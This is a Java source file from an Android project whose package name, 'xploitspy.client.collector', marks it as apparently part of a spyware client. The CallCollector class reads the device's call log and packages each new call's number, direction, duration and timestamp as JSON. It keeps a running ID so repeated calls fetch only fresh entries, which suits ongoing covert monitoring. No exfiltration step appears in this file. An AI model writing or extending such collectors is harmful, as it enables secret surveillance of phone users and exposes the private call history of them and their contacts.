package com.xploitspy.client.collector;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * CallCollector - Mengumpulkan data Call Logs
 */
public class CallCollector {
    
    private static final String TAG = "CallCollector";
    private Context context;
    private long lastCallId = 0;
    
    public CallCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray collect() {
        JSONArray callList = new JSONArray();
        
        try {
            String[] projection = {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE
            };
            
            String selection = CallLog.Calls._ID + " > ?";
            String[] selectionArgs = {String.valueOf(lastCallId)};
            String sortOrder = CallLog.Calls._ID + " ASC";
            
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                sortOrder
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    long id = cursor.getLong(0);
                    String number = cursor.getString(1);
                    int type = cursor.getInt(2);
                    int duration = cursor.getInt(3);
                    long date = cursor.getLong(4);
                    
                    JSONObject call = new JSONObject();
                    call.put("phoneNumber", number);
                    call.put("callType", getCallType(type));
                    call.put("duration", duration);
                    call.put("timestamp", date);
                    
                    callList.put(call);
                    lastCallId = Math.max(lastCallId, id);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting call logs", e);
        }
        
        return callList;
    }
    
    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "missed";
            default:
                return "unknown";
        }
    }
}

